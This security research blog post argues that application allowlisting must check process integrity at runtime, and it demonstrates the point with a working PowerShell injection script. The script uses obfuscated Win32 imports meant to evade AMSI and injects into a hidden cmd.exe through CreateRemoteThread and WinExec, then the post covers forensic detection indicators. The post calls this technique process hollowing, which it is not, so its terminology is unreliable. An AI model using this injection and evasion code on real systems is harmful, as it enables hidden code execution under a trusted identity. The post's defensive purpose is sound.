# Shadow Identities: A Researcher's Guide to Process Hallowing

>**Author:** Rob Shiplo - Sr Research Engineer - Systems & Endpoint Security @ Airlock Digital
>
>**Published:** March 2026 | **Platform:** Windows

---

## The "Border Control" Fallacy
In the world of Application Allowlisting (AAL), the philosophy has traditionally been straightforward: **If a binary is signed and trusted, it is allowed to run.** This approach is highly effective for stopping a user from executing an untrusted .exe downloaded from the web.

However, through my recent research, I wanted to explore a deeper question: What happens when that trusted identity, like cmd.exe or Notepad.exe, is hijacked after the "Border Control" has already let it through?

## Beyond "Good vs. Bad" Binaries
Airlock Digital is widely recognized as the gold standard in this space precisely because it goes beyond the binary choice of "good vs. bad" executables. While many tools stop at the perimeter, true security requires understanding that **trust is not a one time event.** If a security solution only checks the digital signature at the moment of execution, it is vulnerable to Process Hallowing. This is the "Shadow Identity" problem: the process has a trusted passport, but it is currently carrying out an unauthorized mission in memory.

---

## The AAL Gap: Why This Matters
Most practitioners view Process Hallowing strictly as an EDR problem. However, I believe we should ask: **Should it also be a core AAL concern?**

1. **Inherited Trust:** If an AAL policy trusts Notepad.exe, and I successfully hallow it, I am effectively inheriting all the permissions and reputation associated with that trusted identity.
2. **The Persistence of Trust:** If a tool only validates a file when it loads from disk, it remains blind to the "Stains" that appear in memory once the process is live.
3. **Runtime Integrity:** My research suggests that AAL must evolve. It is no longer enough to trust the binary on the disk; we must ensure the integrity of the process throughout its entire lifecycle.

---

## The 24H2 Battleground: Lessons from the Lab
During my research on Windows 11 24H2, I discovered that Microsoft has significantly hardened the gates. My attempts to hallow different processes revealed a clear hierarchy of protection:

* **CalculatorApp.exe (The Fortress):** Modern UWP apps run in an **AppContainer.** Even when I successfully injected code, the process identity was so restricted that it could not spawn a shell or write to public folders.
* **Notepad.exe (The Hybrid):** Notepad has moved toward a more modernized architecture. I hit significant roadblocks with **Control Flow Guard (CFG)** when trying to hijack its execution flow, however usable - I wanted to do more.
* **Cmd.exe (The Classic):** This proved to be the ideal research target. As a "Medium Integrity" process without AppContainer restrictions, it allowed the hallowed identity to perform functional tasks without kernel intervention.

---

## Technical Anatomy: The Bypass
To demonstrate this, I developed a PowerShell script that interacts directly with the Windows kernel via the Win32 API. This script serves as the bridge, allowing an untrusted script to "wear the mask" of a trusted system process.

### The Research Tool: Unified Identity Breach Script
This script uses obfuscated "Gates" to bypass AMSI and perform the core stages of a hallow: Allocation, Implantation, and Execution.

```powershell
$Sig = @"
using System;
using System.Runtime.InteropServices;
public class Researcher {
    [DllImport("kernel32.dll", EntryPoint="OpenProcess")]
    public static extern IntPtr Gate1(uint a, bool b, int c);

    [DllImport("kernel32.dll", EntryPoint="VirtualAllocEx")]
    public static extern IntPtr Gate2(IntPtr a, IntPtr b, uint c, uint d, uint e);

    [DllImport("kernel32.dll", EntryPoint="WriteProcessMemory")]
    public static extern bool Gate3(IntPtr a, IntPtr b, byte[] c, uint d, out int e);

    [DllImport("kernel32.dll", EntryPoint="CreateRemoteThread")]
    public static extern IntPtr Gate4(IntPtr a, IntPtr b, uint c, IntPtr d, IntPtr e, uint f, out uint g);

    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
}
"@
try { Add-Type -TypeDefinition $Sig -ErrorAction SilentlyContinue } catch {}

# 1. Targeting the Trusted Identity
$Victim = Start-Process cmd -WindowStyle Hidden -PassThru
$h = [Researcher]::Gate1(0x1F0FFF, $false, $Victim.Id)

# 2. Memory Staging
$Command = "cmd.exe /c echo Breach_Verified > C:\Users\Public\hallowed.txt"
$Bytes = [System.Text.Encoding]::ASCII.GetBytes($Command + "`0")
$p = [Researcher]::Gate2($h, [IntPtr]::Zero, [uint32]$Bytes.Length, 0x3000, 0x40)

# 3. The Implant
[Researcher]::Gate3($h, $p, $Bytes, [uint32]$Bytes.Length, [ref]0)

# 4. The Trigger
$k32 = [Researcher]::GetModuleHandle("kernel32.dll")
$func = [Researcher]::GetProcAddress($k32, "WinExec")
[Researcher]::Gate4($h, [IntPtr]::Zero, 0, $func, $p, 0, [ref]0)

Write-Host "[!] Identity Breach Successful on PID $($Victim.Id)" -ForegroundColor Green
```

## Forensic Investigation: Proving the Breach
To verify the success of the injection, I used a combination of Process Hacker and WinDbg to uncover the "Forensic Fingerprint" left behind.

### 1. The Thread "Ghost" (Process Hacker)
While monitoring the **Threads** tab in Process Hacker, I caught the exact moment of the handover. A new thread appeared that did not belong to the original process logic. 

The giveaway was the **Start Address.** Most legitimate threads in cmd.exe start within its own code or standard system workers. My hallowed thread, however, started directly at `kernel32.dll!WinExec`. This is an immediate red flag: a trusted process is suddenly birthing a thread directly into an execution API. 



Furthermore, the **Call Stack** for this thread was "shallow." In a legitimate execution, you would see a deep chain of function calls leading back to the main executable. Here, the thread was essentially "born in a vacuum," a primary indicator that the execution was forced by an external actor.

### 2. The Memory "Stain" (Process Hacker)
In the **Memory** tab, I identified a 4KB region marked as **Private Data** and **RWX** (Read, Write, Execute). This is a textbook indicator of an unmapped memory segment. In a healthy process, executable memory should almost always be "Image" memory, meaning it is backed by a verified file on the disk. A standalone RWX block is a "Stain" that represents unauthorized intent.

### 3. The 24H2 Taxonomy: Security Tier Analysis
My research across different Windows 11 24H2 processes revealed that the "Identity" I chose to hijack determined the success of the breach. This taxonomy highlights the layering of modern Windows defenses:

| Target Process | Security Tier | Result | Principal Insight |
| :--- | :--- | :--- | :--- |
| **CalculatorApp.exe** | AppContainer / UWP | **FAIL** | Restricted SID prevents hallowed thread from touching the filesystem. |
| **Notepad.exe** | CFG / Hybrid | **PARTIAL** | Control Flow Guard prevents hijacking common function return addresses. |
| **Cmd.exe** | Medium Integrity | **SUCCESS** | Standard Win32 identity allows full inheritance of user permissions. |

---

## Conclusion: Trust is Not Static
The primary takeaway from this research is that **trust should not be a one time event.** A binary that is trusted at startup can be subverted in memory seconds later. 

This is where the limitation of traditional "Border Control" security becomes clear. If an AAL solution only validates a file at launch, it creates a window of opportunity for "Shadow Identities" to operate. 



True security, as pioneered by solutions like Airlock Digital, requires a move toward **Runtime Integrity.** We must transition from asking "Is this file allowed?" to "Is this process identity still acting with integrity?" By monitoring the lifecycle of the identity, rather than just the signature on the disk, we can close the gap that Process Hallowing seeks to exploit.
